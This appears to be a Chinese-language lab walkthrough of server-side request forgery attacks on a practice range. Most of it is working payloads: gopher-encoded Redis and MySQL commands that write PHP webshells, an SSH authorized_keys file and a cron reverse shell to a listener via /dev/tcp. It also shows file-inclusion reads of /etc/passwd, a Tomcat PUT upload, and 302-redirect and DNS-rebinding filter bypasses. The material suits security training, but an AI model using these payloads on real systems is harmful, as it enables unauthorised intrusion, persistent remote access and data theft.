![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oicyT17M1ZUBRzTc391AlatiaIyia3p4UF6HrJG1NaW65Wibt2K2rXjb8EQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oiar2yeagnrgJLIQHnXsTFqR2b7CI6xq5MGAX86iblwEl9ADxuPoWo4QQ/640?wx_fmt=png&from=appmsg "")  
- 右键查看源代码，查看关键的参数，以便于构造Payload  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oGyibqq3yIoamlDwH7UGdHSN2TaE393icXKVAx5HrsYWQY847BeQIyh2g/640?wx_fmt=png&from=appmsg "")  
- Payload构造  
  
- 指定Content-Type为multipart/form-data  
，而且要  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oD5qK2Wm7EPQJRWRNPpFhopFbC5odXia00x6MBPnicwiack9Uud2hDBtCw/640?wx_fmt=png&from=appmsg "")  
- 构造完以后使用Burp抓包，发送到Repeater  
  
```
gopher://172.250.250.6:80/_
```  
- 拼接Payload，并且进行两次URL编码，发送后，发现上传成功  
  
- 验证  
  
```
http://172.250.250.14/upload/test.php
```  
## 文件包含  
- 使用靶场中的upload-labs模块  
  
```
http://172.250.250.14/include.php
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ocd1AQZGvUblOtdGOJ9ibc8vjHg8jD7ZBYrrWmWsAz9vDGIgJNfSh2vg/640?wx_fmt=png&from=appmsg "")  
- file://  
伪协议读取文件  
  
```
http://172.250.250.14/include.php?file=file:///etc/passwd
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01obt1eTN9kYGrYqibsfEZKf5LT39KxIWpqQG8UR6icbl8XjR03sQcCcUpg/640?wx_fmt=png&from=appmsg "")  
- data://  
伪协议执行命令  
  
```
http://172.250.250.14/include.php?file=data://text/plain,<php%20system('id');%20?>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ollbCF9qqGRAGITQuKX2F5d6teBv2QlGtts6lUy2klzdpSFmfP1UbyQ/640?wx_fmt=png&from=appmsg "")  
## Mysql未授权  
- 有些场景下，一些站点的Mysql数据库没有设置密码，且可以通过网络访问  
  
- 所以可以通过SSRF漏洞对目标的Mysql进行操作  
  
- Payload工具下载地址：  
https://github.com/tarunkant/Gopherus  
  
### 查询数据  
- 通过Gopherus工具生成Payload  
  
```
python2 gopherus.py --exploit mysql
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oQ48lBGdx3ibGV5kXAwbKVMuZ2kR16n0nMDzJGO5ic4RgRTDSVpicDEVZQ/640?wx_fmt=png&from=appmsg "")  
- 填写登录的用户（此处为root）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o9DNpyyNdHZYFLhjgtTNu2GhTia6mSFAwed15BGTRnFRMeNgDoFCnMBw/640?wx_fmt=png&from=appmsg "")  
- 填写查询语句  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01omDlqVFJNAwlNT3yiaWTQmkj5U3pIYTObSLSapjnyJtpwvXFedDbh3Jg/640?wx_fmt=png&from=appmsg "")  
- 更改生成Payload中的地址为目标地址，然后在存在SSRF的点进行提交，发现查询成功  
  
```
gopher://172.250.250.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%1d%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%73%65%63%75%72%69%74%79%2e%75%73%65%72%73%01%00%00%00%01
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oIwmyYolwewViaVibSHEAG2hm6bp40atlCRdoRiadISjIb1doIzcic2XEfw/640?wx_fmt=png&from=appmsg "")  
### 写入数据  
- 构造Payload查看是否有写入权限  
  
```
show variables like '%secure%';
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oRSWqnrfjnjlzNxWWxIlpCzPjwuWGprTKo5w4x27Qw5icibX867OFVo2w/640?wx_fmt=png&from=appmsg "")  
- 通过提交Payload，发现secure_file_priv  
没有值，说明可以写入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oVavvMLAsibzKlsOCWfKd8Xc1TBt0tFtTVfbLYZ3kmpSaCaV8ZNXIkbw/640?wx_fmt=png&from=appmsg "")  
- 构造Payload，往目标写入一句话木马  
  
- 前提是知道绝对路径  
  
```
select "<?php @eval($_GET['cmd'])?>" into outfile '/var/www/html/cmd.php';
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oZ7dSrYxUlj9MGD8ZpTPM23WgiaSGmzErRm7XkNTdd9aqlCdn8NmcO7Q/640?wx_fmt=png&from=appmsg "")  
- 执行成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oJe6qJGiaJpnmS64ZUDfmdibxlFsCmpbBTvq6r7NrgrQS1sWfOzteM1BQ/640?wx_fmt=png&from=appmsg "")  
- 查看靶机的目录，发现成功写入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oQ3ibJQ7yibhOd5vn8fRU4hnHtXNcFU0oOdAFdmtBqbTibI7Tlr0BklM2Q/640?wx_fmt=png&from=appmsg "")  
## 通过PUT对Tomcat进行文件写入  
- 在靶场中内置了一个Tomcat环境  
  
```
http://172.250.250.7:8080
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oJ5YDwEpmEztibXIOeHVyr5xxYqN6dnSutRNEYXFqNHo5QpWvbkEfN0g/640?wx_fmt=png&from=appmsg "")  
- 构造Payload  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01osk75x0uy3IwnqE0vaXhAuvdib9sWia2BmlbwmlVuxgfZSIvghTfOGLSQ/640?wx_fmt=png&from=appmsg "")  
- 用Burp抓包，发送到Repeater  
  
```
gopher://172.250.250.7:8080/_
```  
- 拼接Payload，并且进行两次URL编码，点击发送  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oJ8UzM1LW4tMh1epcrVOnjmfEBlOoDStlQZrZztLiacHdic1lQEXKFMQQ/640?wx_fmt=png&from=appmsg "")  
- 在存在SSRF的机器访问这个文件，发现已经成功上传，并可以执行命令  
  
```
http://172.250.250.7:8080/6.jsp
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oRNOoicxLR439VR1iaOhE3gVntoqVEbGjd4wAw7XP58oVcNrdwcuL4FiaA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o5l6rAuDIowPlswF8qNEicFUMkEm1TINvLqaKbTN0tseeIpyMAN079Lw/640?wx_fmt=png&from=appmsg "")  
## SSRF打Redis  
- 靶场地址如下，可以看到此时是未授权的页面（不需要用户名密码认证），有很多信息  
  
```
dict://172.250.250.9:6379/info
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oYEQnOPW5kxx6eYA231mTjgpc68bRpdhBbe62CJrFy4TiaUliahR4ficpg/640?wx_fmt=png&from=appmsg "")  
- 利用时的注意事项  
  
- 需要知道要写的文件地址和路径  
  
- 要对写入文件有读写权限  
  
- 会写入很多无用数据，有可能会导致程序出错  
  
### 未授权写入webshell  
- 原理  
  
- 设置写入的web路径：config set dir /var/www/html/  
  
- 设置shell文件的文件名：config set dbfilename phpinfo.php  
  
- 往数据库插入payload：set payload "<?php phpinfo(); ?>"  
  
- 保存：save  
  
- 退出：quit  
  
- 手动构造Payload  
  
- 在靶机上通过tcpdump抓包  
  
```
tcpdump -i br-5af779a344a9 tcp and port 6379 -w redis.pcapng
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oy9BKQRtxMIibUywcmHM2QHhHhaq2HMv15UvTNcBfDoAyCg7icy33UMYQ/640?wx_fmt=png&from=appmsg "")  
- 通过Redis客户端工具连接到靶场的Redis服务器  
  
```
redis-cli -h 172.250.250.9
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o7OSOLMFR0mLe5iaXowtOZpJu2DAhJebHgMLnr4Tj1dncEibibo8P9xianQ/640?wx_fmt=png&from=appmsg "")  
- 设置写入的web路径  
  
```
config set dir /var/www/html/
```  
- 设置shell文件的文件名  
  
```
config set dbfilename phpinfo.php
```  
- 往数据库插入payload  
  
```
set payload "<?php phpinfo(); ?>"
```  
- 保存  
  
```
save
```  
- 退出  
  
```
quit
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01onQ472sdnkUErPQUbASr8iaREic2ec0Rwib3tREXtJ4razX5jd3cziaRAlQ/640?wx_fmt=png&from=appmsg "")  
- 停止抓包，成功生成数据包文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oj353RpVibZzFCiaDp7Q0SDuBBpMomicZowxicsxk7VliaibRu1O6SmfF1Hiag/640?wx_fmt=png&from=appmsg "")  
- 进入到容器中，查看web目录，确实生成了一个phpinfo.php文件，查看时发现前后多了一些redis的相关信息，但是这里我们的代码主题是完整的，所以没有影响，写入ssh公钥的时候就需要注意  
  
```
docker exec -it ea bash
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oGDDMvEL4ZOzX7r4A9RrFOqTI36ayRVXffxmFzMpRNw2NHxSNozeiaXA/640?wx_fmt=png&from=appmsg "")  
- 用wireshark打开这个数据包文件，然后最终TCP流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o7lhOh2kZ3YbMC95V8f0TerUaeHg8aKEkRYNzBmRDj5vefkLxJia8jfA/640?wx_fmt=png&from=appmsg "")  
- 过滤出目标端口为6379的数据包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oUZRRrJKxD5XkfcFQibOw1FLmvOYz0VThIliaMY1tDYlNV8IDlcvbQMfg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ojBj20SoBDRNOKbS6TYCO3uhB7u9uZm94UrL7P1WnHGDvrmO7IhPKag/640?wx_fmt=png&from=appmsg "")  
- 将过滤出来的内容copy到notepad++，把前三行删除，加上退出指令，参数解释如下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oJFj6cviaA2ica2krSmUQD9Bxo6VicRwbtTV4TXcmNEceDbPfveVicdPOkA/640?wx_fmt=png&from=appmsg "")  
- 在notepad++中将换行符换成%0d%0a  
，并且将问号进行URL编码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o5DFLMAf1DmDmdukZp5Fpk7zfrRAjyibCtDLxiasNSPtO7Z3MEjzsHReg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o3E010jOfkX7C7FNiaOIkZYiaRLXx2Acvk4JlzibdViasAdvria7oNJIeRNQ/640?wx_fmt=png&from=appmsg "")  
- 拼接gopher://  
伪协议形成最终的Payload  
  
```
gopher://172.250.250.9:6379/_*1%0d%0a$7%0d%0aCOMMAND%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$14%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$11%0d%0aphpinfo.php%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$7%0d%0apayload%0d%0a$19%0d%0a<%3Fphp phpinfo(); %3F>%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ogxELFdBM5Qk1dichF16YHem7GXkHyr5knXrdMG3Pzq8onkthqsibqqow/640?wx_fmt=png&from=appmsg "")  
- 在存在SSRF的地方提交Payload即可写入文件（先在容器删除刚刚生成的）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o0u3FucicOUqBMENryqV1YAgwwjwja87gicRtABKkdd3rsoF64hnvxYUQ/640?wx_fmt=png&from=appmsg "")  
- 此时访问这个文件，发现访问成功  
  
```
http://172.250.250.9/phpinfo.php
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oYjw1QVDojN7GKF5bQ1v0Z6PNdkcK83v293KKUJU08WT2JgQSGcE2Wg/640?wx_fmt=png&from=appmsg "")  
- 工具使用  
  
- 通过Gopherus工具生成Payload  
  
```
python2 gopherus.py --exploit redis
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oE01YF7V9Ewtv0Y5Q0u77gmUCGYsxSEbic6ReCwz4tW7FI7EgRxHqAOg/640?wx_fmt=png&from=appmsg "")  
- 选择phpshell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oU2nicE2NGosDJobaRyPNtGUtTQSPAc5rmbcBCkQyiaycGTqPScUrjDaw/640?wx_fmt=png&from=appmsg "")  
- 选择写入的目录是否为/var/www/html  
（此时默认回车即可）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oa9oT52mibsahticTbHNIUiaDNb7guh5tqRcwTqibzCS1gCyn97dgSJEu1A/640?wx_fmt=png&from=appmsg "")  
- 填写需要写入的内容，选择默认的，会生成一个命令执行的Payload  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oR8u2LF1wibaVsdeEHeAWHkQO0L7icQ3icabYPXDmz29cGZ29TPdJEpPQg/640?wx_fmt=png&from=appmsg "")  
- 更改生成Payload中的地址为目标地址，然后在存在SSRF的点进行提交  
  
- 由于没有写quit  
退出，所以会出现一个挂起的情况  
  
```
gopher://172.250.250.9:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oPXZHZP0x93fM0zOp4vXnWDFOPibZlqxk85cbbQZt9JwWhWOhjEyvQrA/640?wx_fmt=png&from=appmsg "")  
- 此时通过这个文件执行命令，发现能够执行成功  
  
```
http://172.250.250.9/shell.php?cmd=id
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oJsQOxibESeht9n62cmEOe0f3qO5NWstazCCdCHqJiaD2JXo3BsoylFVA/640?wx_fmt=png&from=appmsg "")  
### 未授权写入ssh公钥  
- 先通过kali生成一个密钥对  
  
```
cd ./.
sshssh-keygen -t rsa
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oaVzRHb99f1VZ0Mtvk7S24SictL9ibUVEibKr7YxSHiarzY60d6fXka3icJg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ozjBgOMThl77XVGovtR4GeZFicafAKdxchcArr9zuZKu9JibGfEicu4QXQ/640?wx_fmt=png&from=appmsg "")  
- 手工构造Payload，给目标写入ssh公钥  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o271yLic5eZeTVHwuT6vw4DNG3WIJuiaXtk3ZMowgpQ3ia3OscLyCckBJQ/640?wx_fmt=png&from=appmsg "")  
- 解释如下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01odCg4OOjiawN9tqOSOqgYjYw7yomXsIzXNxp5mLv9IBdH86Xiaqs8UUFA/640?wx_fmt=png&from=appmsg "")  
- 在notepad++中将换行符换成%0d%0a  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o9anvTvnnt3wQ0YmVjzo8l9jOO02UO2NIplJ6StJ3QcZvC0XpEvXnbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oicqRFdJLz0l4rVjsquGE8CvbVN0iceVk6GmDEnreUQoIRMYTNpz0qH4Q/640?wx_fmt=png&from=appmsg "")  
- 拼接gopher://  
伪协议形成最终的Payload，在存在SSRF的地方提交  
  
```
gopher://172.250.250.9:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$7%0d%0apayload%0d%0a$566%0d%0a%0d%0a%0d%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6Vd2R2kTchU2OqZyCjAT6GO+NpXjyZkcKrgDLK/DALyx0xYfFl2dzSCKExJu36maiX9lCwNlAk2lBbCEJqxgPmV6+As7PDdl6HolVg19ZohlUpceiNTLYf0pRalm4EMvo1TNzrWtwM42Uwjmf+AY1eq8avqH5gpF1GTSm6tgX2E/4jeDFDHcdYshHVvA5hQXjpnkTEkdRprIlKbrvsdgUf1HKM6JBKq/gV/Po1pt+I1oRaBCK1AQDEv9GpQ8KMmtGfyy/QoPsdb7QUxZ98pXGIiAgj79YwM9xB0sMJjkn53CjVFlmGm7cKX6TkW9dkhm3wazkY9VGewwoIfIlQtyu+fYBNAwXFhRYgQvg4SryTfImUJIDfTrXi+14hNPpQvVxGR1FfP2ErM+WSRzJvVe33EZGLB+TlqSQp+pFo7ip0E3u7vq62zrzJFNNWlsUR/tu3pknlUx2BvPAxi1aGbhWZCqLhx1s76VQgKXEJ0hkN89TnJ15EYHV8ncQ24vCNo8= root@kali%0d%0a%0d%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oQF4suFuo1bgxP3m3xiaYjTtT6r5TIW0K48XmibdOp85mbX7QiaPzBzaIQ/640?wx_fmt=png&from=appmsg "")  
- 进入对应的docker容器，发现上传成功  
  
```
docker exec -it ea bash
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ouLdlhxdhloomd8EjePv6aE2EPTNfpqvVnvuZWNDBiashPiahY90oC6WA/640?wx_fmt=png&from=appmsg "")  
- 此时使用kali调用私钥登录目标靶机，发现不需要密码即可登录  
  
```
ssh -i id_rsa -p 2222 root@10.10.10.61
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o3oPg4qmytLZHohiboSdiaeYnSCJVKgq0as7ibjqexhBftENLaoeCbDgsQ/640?wx_fmt=png&from=appmsg "")  
### 未授权计划任务反弹shell  
- 注意：此时不是写入到/etc/crontable  
，而是写入到/var/spool/cron  
目录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oicY2kfiaKRVicTsJRTwBJIUUH9BkzlL5WARicLlNVpdUSFm9kBF5USxDzQ/640?wx_fmt=png&from=appmsg "")  
- 通过Gopherus工具生成Payload  
  
```
python2 gopherus.py --exploit redis
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o2lVlYy3uicBztmZNGyd2DtAOXLnzYH9jByMF74BzCv9pxxr2fljSiaqg/640?wx_fmt=png&from=appmsg "")  
- 选择反弹shell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o75V1E8gqFJCJ81x058e8gKv8C1d4T3NvSmnIIOOAAtIHFVcBCGRrvQ/640?wx_fmt=png&from=appmsg "")  
- 填写kali的ip地址（在哪接收弹回的shell就填写哪台机器的ip地址），然后下一步默认回车，即可生成Payload  
  
- 注意：生成的Payload默认监听端口是1234，可以自己改  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ocSLdbf9CmMG7zFJTFicZ93ELejEWfM4NfZjjfa0iaM94A31DX0wfgVrQ/640?wx_fmt=png&from=appmsg "")  
- 在kali上监听1234端口  
  
```
nc -lvp 1234
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o0As1ic56Xk3MtlalwS69ibrPJCWdyjyiaT5jDW7FNeCIekmiaE4KJuYGag/640?wx_fmt=png&from=appmsg "")  
- 拼接gopher://伪协议  
，更改生成Payload中的地址为目标地址，然后在存在SSRF的点进行提交  
  
- 由于没有写quit  
退出，所以会出现一个挂起的情况  
  
```
gopher://172.250.250.9:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2467%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/10.10.10.129/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```  
- 等待一段时间即可反弹shell成功  
  
## 绕过限制  
### 302跳转绕过  
#### 原理  
- 为了防御SSRF攻击，开发者可能写了一些限制规则，不允许访问内部IP地址（私网地址）或特定的敏感文件/路径。  
  
- 如果服务在处理302跳转时没有重新应用这些规则，那么攻击者就可以通过返回一个302跳转的响应来引导服务器访问这些受限资源。  
  
#### 靶场复现  
- 此时想要访问http://127.0.0.1/flag.php  
上的内容，但是直接请求本地环回地址或者内网IP的话是被阻止的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oWaMmX23q3eiaTYiaJyMSniaoonntJiaeS9VFrJqdNjABW8XjP9CJSjAiaaQ/640?wx_fmt=png&from=appmsg "")  
- 此时的SSRF服务器如果可以访问公网，就可以在VPS上准备一个302重定向的代码文件（文件类型根据实际情况选择）  
  
- 如果目标服务器在处理302跳转时没有检查新的URL是否符合其安全策略，就会按照Location头部指示的位置发出请求  
  
```
<?php
  header("Location: http://127.0.0.1/flag.php");
?>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ocKicVqpRibOhMd59jCkZfsN1fpVxU4PVnzaV2kujL0156d2Y0ZiayNNKA/640?wx_fmt=png&from=appmsg "")  
- 在VPS使用php启动一个临时的服务器  
  
```
php -S 0.0.0.0:8080
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01onpqfoOCjUWRbzPAkCtUcEPUjww1Y5RlzkLncFYzsziashTbmVwzC29A/640?wx_fmt=png&from=appmsg "")  
- 在存在SSRF的位置访问刚刚准备的302重定向文件，发现成功绕过限制  
  
```
http://139.9.200.42:8080/test.php
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oxlhT4Qh2z34Ty13gsHLcVmMp4gb6srJ2tF1fEa79554IJlfT9pXhLw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ovL0S2H6zukbESLgOqz5jsdMXHNKe6WyUuib7ufoVfrSoia6sV2U3ZACg/640?wx_fmt=png&from=appmsg "")  
### DNS重绑定绕过  
#### 原理  
- DNS重绑定的核心在于利用了DNS查询结果的可变性以及HTTP请求处理过程中可能存在的时序问题。  
  
- 攻击者首先注册一个由他们控制的域名，并配置DNS记录指向攻击者的VPS。  
  
- 当目标服务器尝试对该域名进行DNS解析并建立连接时，攻击者快速更改该域名的DNS记录，使其指向一个内部IP地址或其他受限资源，就可能绕过对内网资源的访问限制。  
  
- 比如：第一次提交时，首先WAF检测到攻击者通过SSRF漏洞访问的是一个域名，通过DNS解析发现是合法的地址（不是内网地址），就通过了WAF检测；此时如果攻击者在极短的时间内更换了域名解析的地址为目标内网的地址，服务端开始请求资源的时候，再次做DNS解析，此时解析出来的就是内网地址，就可能绕过对内网资源的访问限制，成功获取到内网的信息  
  
- 注意：攻击者获取可控的域名，最好是可以设置较低的TTL值（比如：0），这样可以快速更新DNS记录。  
  
- TTL值DNS记录在DNS缓存中可以保留的时间长度（以秒为单位）。当一个DNS查询发生时，结果会被缓存一段时间，这段时间由TTL决定，在这段时间内，后续的相同域名查询会直接使用缓存中的结果，而不会再次执行DNS查询。  
  
- 所以通过较低的TTL值，可以避免在第二次DNS解析时，用的是缓存中的结果，而不是重新绑定的ip地址  
  
- 最理想的TTL值是0，即在第一次解析之后，立马换成我们想要访问的内网IP  
  
#### 靶场复现  
- 直接访问内网的文件发现被过滤  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ombjzoWHDF8yxDtM17hKrpsdf61A3dg6aFCzacqJuoj8ib3PYmXTZXgQ/640?wx_fmt=png&from=appmsg "")  
- 一个提供DNS解析TTL值为0的网站：  
https://lock.cmpxchg8b.com/rebinder.html  
  
- 在这个网站中输入一个公网IP和一个需要访问的目标内网地址，先后顺序无所谓，可以发现生成了一个域名  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oDYXVmkWsOozDuNc8dDoC9PiabZbGlQcsjE3dtIygXOEsJzRBZGticuCw/640?wx_fmt=png&from=appmsg "")  
- 此时在靶场中通过这个域名请求内网的资源，发现成功获取内网的资源  
  
```
http://7f000001.8b09c82a.rbndr.us/flag.php
```  
  
